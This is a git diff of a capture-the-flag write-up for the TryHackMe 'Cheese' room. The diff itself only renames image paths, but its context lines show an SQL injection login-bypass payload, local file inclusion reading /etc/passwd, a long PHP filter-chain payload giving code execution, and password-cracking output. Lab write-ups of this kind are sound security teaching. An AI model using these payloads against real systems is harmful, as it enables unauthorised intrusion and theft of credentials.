@@ -4,9 +4,9 @@ author: 0xcracker
 categories: [TryHackMe]
 tags: [web, rustscan, portspoofing, feroxbuster, sqli, sqlmap, LFI, RCE, ssh, service, timer, suid, sudo, sysmemstl, grep, openssl, unshadow]
 render_with_liquid: true
-img_path: /images/Cheese-CTF
+img_path: /images/TryHackMe/Cheese
 image:
-  path: /images/TryHackMe/Cheese-CTF/room_image.webp
+  path: /images/TryHackMe/Cheese/room_image.webp
 ---
 
 <a href="https://tryhackme.com/room/cheesectfv10" style="display: flex; align-items: center; background-color: #333; padding: 10px; border-radius: 5px; box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3); color: #a1a1a1ff; text-decoration: none;">
@@ -70,7 +70,7 @@ Also known as `Emulating Services` or `Camouflage Techniques`
 
 By checking the common open ports it is clear that custom `web application` is running on port `80`.
 
-![](/images/TryHackMe/Cheese-CTF/login-page-on-port-80.png)
+![](/images/TryHackMe/Cheese/login-page-on-port-80.png)
 
 ##  bypass a login page authentication using SQL injection
 #### **option |**
@@ -109,12 +109,12 @@ Upgrade-Insecure-Requests: 1
 username=ee&password=czcxzxcxz
 ```
 
-![](/images/TryHackMe/Cheese-CTF/sqlmap.png)
+![](/images/TryHackMe/Cheese/sqlmap.png)
 
 We also found that the DBMS is `MySQL`.
 
 #### **option ||**
-![](/images/TryHackMe/Cheese-CTF/sql-injection.png)
+![](/images/TryHackMe/Cheese/sql-injection.png)
 
 After trying a couple of simple SQL injection payloads, we are able to bypass the login using the payload `' || 1=1;-- -` as the username.
 
@@ -165,11 +165,11 @@ After trying a couple of simple SQL injection payloads, we are able to bypass th
  ```
  
  
-![](/images/TryHackMe/Cheese-CTF/messages.png)
+![](/images/TryHackMe/Cheese/messages.png)
  
 this will redirect us to `http://10.10.202.162/secret-script.php?file=php://filter/resource=supersecretmessageforadmin`
  
-![](/images/TryHackMe/Cheese-CTF/messages2.png)
+![](/images/TryHackMe/Cheese/messages2.png)
  
 you can check into [SecLists](https://github.com/danielmiessler/SecLists)
    
@@ -214,13 +214,13 @@ OR
 http://10.10.202.162/secret-script.php?file=php://filter/resource=../../../etc/passwd
 ```
 
-![](/images/TryHackMe/Cheese-CTF/lfi.png)
+![](/images/TryHackMe/Cheese/lfi.png)
 
 now we locate name  user `comte` in this system.
 ```console
 view-source:http://10.10.202.162/secret-script.php?file=../../../etc/passwd
 ```
-![](/images/TryHackMe/Cheese-CTF/user.png)
+![](/images/TryHackMe/Cheese/user.png)
 
 Then you can explore the rest of the files yourself.
 ```console
@@ -359,7 +359,7 @@ output => the payload
 php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
 ```
 
-![](/images/TryHackMe/Cheese-CTF/first-payload.png)
+![](/images/TryHackMe/Cheese/first-payload.png)
 
 now we able to execute any command on the system.
 
@@ -453,7 +453,7 @@ ssh-keygen -f cheese_rsa -t rsa
 cat cheese_rsa.pub
 ```
 
-![](/images/TryHackMe/Cheese-CTF/ssh-keygen.png)
+![](/images/TryHackMe/Cheese/ssh-keygen.png)
 
 > now upload `cheese_rsa.pub` into target machine
 {: .prompt-info }
@@ -893,4 +893,4 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 0g 0:00:03:32 1.00% (ETA: 01:36:10) 0g/s 796.1p/s 1594c/s 1594C/s millie23..machines1
 0g 0:00:08:48 2.48% (ETA: 01:36:58) 0g/s 782.0p/s 1564c/s 1564C/s janilson..ja1991
 ```
-![](/images/TryHackMe/Cheese-CTF/Congratulations.png)
+![](/images/TryHackMe/Cheese/Congratulations.png)
